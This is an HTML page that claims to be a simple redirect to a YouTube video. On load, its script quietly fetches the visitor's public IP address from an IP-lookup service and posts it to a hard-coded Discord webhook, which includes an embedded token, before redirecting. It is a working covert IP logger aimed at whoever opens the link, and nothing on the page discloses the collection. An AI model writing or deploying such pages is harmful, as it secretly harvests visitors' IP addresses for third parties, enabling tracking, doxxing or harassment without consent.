<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    async function sendIPAndRedirect() {
      const targetSite = "https://youtu.be/dQw4w9WgXcQ?si=bNXslHXQ1FGqgqGv";

      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        const ip = data.ip;

        const webhookUrl = 'https://discord.com/api/webhooks/1372316286230728835/vJEH3Ns5L2SKa3__FIDzKLhQ-4W2fbmhUre_JzpDX59KeGTlOSUxPmagXOuIPAP6Tmpn';

        await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `Visitor IP: ${ip}`
          }),
        });
      } catch (err) {
        console.error('Error sending to Discord:', err);
      } finally {
        window.location.href = targetSite;
      }
    }

    window.onload = sendIPAndRedirect;
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
